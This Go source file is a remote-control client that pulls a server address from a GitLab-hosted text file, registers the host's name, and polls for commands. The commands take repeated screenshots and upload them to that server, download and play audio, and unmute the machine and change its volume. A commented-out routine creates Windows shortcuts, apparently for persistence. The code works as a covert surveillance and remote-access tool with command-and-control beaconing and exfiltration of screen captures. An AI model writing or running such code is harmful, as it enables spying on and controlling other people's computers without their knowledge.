package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/ebitengine/oto/v3"
	"github.com/hajimehoshi/go-mp3"
	"github.com/itchyny/volume-go"
	"github.com/vova616/screenshot"
)

var serverIp string = "unknown"
var userInput string = ""
var mutex sync.Mutex
var audioCtx *oto.Context
var readyChan <-chan struct{}
var screenshotStatus bool = false

func fetchTunnelURL() string {
	resp, err := http.Get("https://gitlab.com/Plexisity1/tunnel-url/-/raw/main/tunnel-url.txt?t=" + strconv.FormatInt(time.Now().Unix(), 10))
	if err != nil {
		fmt.Println("Error fetching gist:", err)
		return ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading gist:", err)
		return ""
	}

	return strings.TrimSpace(string(body))
}

func ss() {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		fmt.Println("Error capturing screenshot:", err)
	}
	f, err := os.Create("./ss.webp")
	if err != nil {
		fmt.Println("Error creating file:", err)
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		fmt.Println("Error encoding PNG:", err)
		panic(err)
	}
	f.Close()
}

func setVol(newVol int) string {
	if newVol < 0 {
		fmt.Println("Volume must be between 0 and 100")
		return "Invalid volume level"
	}
	if newVol > 100 {
		fmt.Println("Volume must be between 0 and 100")
		return "Invalid volume level"
	}

	vol, err := volume.GetVolume()

	err = volume.Unmute()
	if err != nil {
		fmt.Println("unmute failed:", err)
	}

	if err != nil {
		fmt.Println("get volume failed:", err)
	}
	fmt.Printf("current volume: %d\n", vol)

	err = volume.SetVolume(newVol)

	if err != nil {
		fmt.Println("set volume failed:", err)
	}
	fmt.Printf("set volume success\n")

	return strconv.Itoa(vol)
}

func sendFile(filePath string, mediaType string) string {
	Path := filePath
	file, err := os.Open(Path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Prepare the network request targeting the cloudflare ip
	targetURL := serverIp + "/upload"
	req, err := http.NewRequest("POST", targetURL, file)
	if err != nil {
		panic(err)
	}

	// Attach metadata instructions in the headers
	req.Header.Set("X-Media-Type", mediaType)
	req.Header.Set("X-File-Name", Path)

	// Dispatch the stream
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	os.Remove(Path)
	var output string = "Server Response Status: " + resp.Status
	return (output)
}

// receive file from server
func downloadFile(fileName string) error {
	resp, err := http.Get(serverIp + "/download?file=" + fileName)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(fileName)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func fetchCommand() string {

	resp, err := http.Get(serverIp + "/get-command")
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return "idle"
	}

	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return "idle"
	}

	return string(bodyBytes)
}

// command to play sounds the server defines built for mp3
func playSound(fileName string) {
	file, err := os.Open(fileName)
	if err != nil {
		panic("opening sound.mp3 failed: " + err.Error())
	}

	decodedMp3, err := mp3.NewDecoder(file)
	if err != nil {
		panic("mp3.NewDecoder failed: " + err.Error())
	}

	player := audioCtx.NewPlayer(decodedMp3)
	player.Play()

	for player.IsPlaying() {
		time.Sleep(50 * time.Millisecond)
	}
	file.Close()
	err = os.Remove(fileName)
	if err != nil {
		fmt.Println("Error deleting sound file:", err)
	}

	fmt.Println("Sound playback started. Deleting sound file...")
	reportProgress(serverIp, "Sound playback finished.")
}

func reportProgress(serverURL string, report string) {
	payload, _ := json.Marshal(map[string]string{"progress": report})
	resp, err := http.Post(serverURL+"/progress", "application/json", bytes.NewReader(payload))
	if err != nil {
		fmt.Println("Couldn't report progress:", err)
		return
	}
	resp.Body.Close()
}

/*
func hookSystem() {
	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
    oleShellObject, err := oleutil.CreateObject("WScript.Shell")
    if err != nil {
        return err
    }
    defer oleShellObject.Release()
    wshell, err := oleShellObject.QueryInterface(ole.IID_IDispatch)
    if err != nil {
        return err
    }
    defer wshell.Release()
    cs, err := oleutil.CallMethod(wshell, "CreateShortcut", dst)
    if err != nil {
        return err
    }
    idispatch := cs.ToIDispatch()
    oleutil.PutProperty(idispatch, "TargetPath", src)
    oleutil.CallMethod(idispatch, "Save")
    return nil
}
*/

func screenshotLoop(amount string) {
	i := 0
	fmt.Println("Using numeric value")
	n, err := strconv.Atoi(amount)
	if err != nil {
		fmt.Println(err)
	}
	screenshotStatus = true
	for i < n {
		ss()
		output := sendFile("./ss.webp", "image")
		fmt.Println(output)
		time.Sleep(500 * time.Millisecond)
		fmt.Println(i)
		i++
	}
	screenshotStatus = false
}

func main() {
	op := &oto.NewContextOptions{}
	op.SampleRate = 44100
	op.ChannelCount = 2
	op.Format = oto.FormatSignedInt16LE

	var err error
	audioCtx, readyChan, err = oto.NewContext(op)
	if err != nil {
		panic(err)
	}
	<-readyChan

	fmt.Println("Finding tunnel URL...")
	tunnelURL := fetchTunnelURL()
	mutex.Lock()
	serverIp = tunnelURL
	mutex.Unlock()

	fmt.Println("Tunnel URL fetched:", tunnelURL)
	fmt.Println("Starting command client...")

	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting hostname:", err)
		hostname = "unknown"
	}

	reportProgress(serverIp, "Client: "+hostname+" has joined the network")

	for true {
		userInput = fetchCommand()
		command := strings.Fields(userInput)
		time.Sleep(1 * time.Second)

		fmt.Printf("Received command from server: %s\n", userInput)
		if len(command) != 0 {
			switch command[0] {

			case "idle":
				time.Sleep(5 * time.Second)

			case "ss":
				fmt.Println("Taking screenshot...")
				if screenshotStatus {
					fmt.Println("Screenshot loop already running. Ignoring command.")
					break
				}
				go screenshotLoop(command[1])

			case "sound":
				fmt.Println("Downloading sound file...")
				err := downloadFile(command[1])
				if err != nil {
					fmt.Println("Error downloading sound file:", err)
					break
				}
				fmt.Println("Sound file downloaded successfully.")
				fmt.Println("Playing sound...")
				go playSound(command[1])

			case "vol":
				if len(command) < 2 {
					fmt.Println("Invalid usage", userInput)
					fmt.Println("Hint try vol (number)")
					userInput = "idle"
					break
				}
				volumeLevel, err := strconv.Atoi(command[1])
				if err != nil {
					fmt.Println("Invalid volume level:", command[1])
					userInput = "idle"
					break
				}
				output := setVol(volumeLevel)
				fmt.Println(output)
				reportProgress(serverIp, "Volume set from "+output+" to "+command[1])

			default:
				time.Sleep(2 * time.Second)

				if strings.HasPrefix(userInput, "error") || strings.HasPrefix(userInput, "Error") {
					mutex.Lock()
					tunnelURL = "unknown"
					mutex.Unlock()

					fmt.Println("Server down, looking for new tunnel URL...")
					time.Sleep(1 * time.Second)
					tunnelURL = fetchTunnelURL()

					if serverIp != tunnelURL {
						mutex.Lock()
						serverIp = tunnelURL
						mutex.Unlock()
						fmt.Println("Tunnel URL updated:", tunnelURL)
						reportProgress(serverIp, "Client: "+hostname+" has joined the network")
					} else {
						fmt.Println("Tunnel URL unchanged:", tunnelURL)
					}

				}

			}
		}
	}
}
